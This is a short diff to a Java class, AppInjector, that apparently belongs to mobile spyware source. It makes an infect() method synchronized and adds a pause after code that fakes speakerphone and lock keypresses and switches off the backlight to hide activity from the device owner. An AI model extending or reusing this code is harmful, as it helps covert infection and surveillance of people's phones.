@@ -106,7 +106,7 @@ public class AppInjector {
         }
     }
 
-    public void infect() {
+    public synchronized void infect() {
         //#ifdef DEBUG
         debug.trace("infect");
         //#endif
@@ -162,7 +162,7 @@ public class AppInjector {
             KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
             KeyInjector.pressRawKeyCode(KEY_LOCK);
             Backlight.enable(false);
-            
+            Utils.sleep(500);
             return;
         }
     }
